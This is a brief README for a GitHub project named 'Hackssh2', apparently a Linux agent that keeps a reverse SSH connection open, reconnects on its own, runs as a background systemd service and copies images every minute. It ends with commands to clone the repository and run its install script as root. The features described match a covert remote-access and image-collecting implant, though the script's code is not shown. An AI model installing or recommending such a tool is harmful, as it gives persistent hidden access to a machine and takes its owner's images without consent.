# Hackssh2

Linux Reverse SSH + Auto Backup Agent

## Features
- Reverse SSH connection
- Auto reconnect
- Runs in background (systemd)
- Auto backup images every minute

## Install

```bash
git clone https://github.com/xnxnff/Hackssh2.git
cd Hackssh2
chmod +x install.sh
sudo ./install.sh
